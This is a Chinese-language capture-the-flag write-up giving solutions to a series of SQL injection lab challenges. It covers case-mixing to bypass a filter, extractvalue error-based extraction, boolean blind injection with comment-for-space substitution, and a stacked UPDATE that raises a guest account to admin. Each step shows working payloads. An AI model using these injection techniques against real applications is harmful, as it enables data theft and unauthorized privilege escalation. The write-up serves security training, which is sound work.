# 题解：SQL 注入 L2 变种 + L3 综合（si2b/si3b/si5b/si7b/sifinal）

> ⚠️ 请先把题目全部做出来，再来看这里！

## si2b UNION 变种（关键字过滤 + 探列数）

① 列数：`1 order by 2` 正常 / `1 order by 3` 报错 Unknown column → **2 列**
② 绕过：过滤器是 `preg_match('/union|select/', $id)`——**忘了加 /i，只拦小写** → 大小写绕过：

```sql
0 UnIoN SeLeCt data,2 FrOm secret_table
```

（枚举表名列名时同样全部大写：`0 UnIoN SeLeCt table_name,2 FrOm information_schema.tables WhErE table_schema=database()`）

**考点本质**：过滤器写得不够严谨（正则漏了大小写）就是漏洞。**做题先试大小写**是注入绕过第一招。

## si3b 报错变种（禁 updatexml + 超长 flag）

updatexml 被 `preg_match('/updatexml/i')` 拦截 → 换同族兄弟 **extractvalue（2 个参数）**：

```sql
-- 枚举 + 分段（flag 47 字符 > 32）
1 and extractvalue(1,concat(0x7e,(select substr(data,1,30) from secret_table)))
1 and extractvalue(1,concat(0x7e,(select substr(data,31,30) from secret_table)))
```

**考点本质**：WAF 拦的是**函数名**，不是**功能**——换一个等价函数就行。函数全家桶背熟的好处就在这。

## si5b 盲注变种（布尔盲注 + 拦空格）

空格被 `preg_match('/\s/')` 拦截 → 用 `/**/` 代替空格（MySQL 把注释当空白解析）：

```sql
1/**/and/**/ascii(substr((select/**/flag/**/from/**/flag5b_table),1,1))>100
```

脚本：`tools/blind_boolean_nospace.py`（和原版唯一区别：payload 里空格全换 /**/）

**考点本质**：**绕过技巧可以叠加**——盲注 × 空格过滤 = 两个技能组合。真实题目很少只考一个点。

## si7b 堆叠变种（UPDATE 改数据 + 业务联动）

```sql
1;UPDATE users SET role='admin' WHERE username='guest'
```

刷新页面 → 角色从 guest 变成 admin → flag 出现。

**考点本质**：注入的终点不只是"查数据"——**改数据**（提权、篡改、删除）往往是利用链的下一步。这题模拟的是真实的"注入提权"场景。

## sifinal 毕业考（综合全链路）

参考脚本：`writeups/solve_final.py`（完整可运行）。核心步骤：

1. **找注入点**：读源码发现参数是 `ticket`（不是 id），数字注入
2. **确认注入**：`1/**/and/**/1=1` ✅ vs `1/**/and/**/1=2` ❌
3. **探测表名模式**：`(select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/and/**/table_name/**/like/**/'f____')=1`
4. **盲猜表名**：fl4gs（逐字符二分）
5. **盲猜列名**：d4ta（模式 'd___'）
6. **量长度 + 逐字符提取 flag**（43 字符，脚本循环）

**考点本质**：这道题把整课串起来了——源码审计找注入点 + 布尔盲注 + 信息枚举 + 过滤绕过 + 脚本化。真实 CTF 题的复杂度就是这样的，只是更长。

## 做题心法总结

1. **先读源码**——注入点、过滤规则、函数全部写在源码里
2. **先试简单绕过**：大小写 → 注释 /**/ → 编码 → 等价函数
3. **报错是导航**：near '...' 定位、参数个数、未知列名
4. **盲注就写脚本**：二分法 + 停止条件（越界返回空、遇到 } 停止）
5. **难点拆解**：表名/列名/数据分开攻，一次只解决一个问题